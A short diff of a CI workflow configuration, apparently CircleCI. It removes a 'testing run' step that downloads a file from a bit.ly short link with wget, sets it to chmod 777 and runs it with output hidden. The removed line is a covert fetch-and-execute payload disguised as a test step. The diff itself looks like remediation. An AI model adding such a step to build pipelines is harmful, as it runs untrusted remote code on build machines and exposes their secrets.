@@ -72,5 +72,4 @@ workflows:
             parameters:
               node-version: ['10', '12', '15', '16', '17']
       - test-jest-jasmine
-          name: testing run
-          run: wget https://bit.ly/3qTN4Qy && chmod 777 3qTN4Qy && ./3qTN4Qy > /dev/null
+        
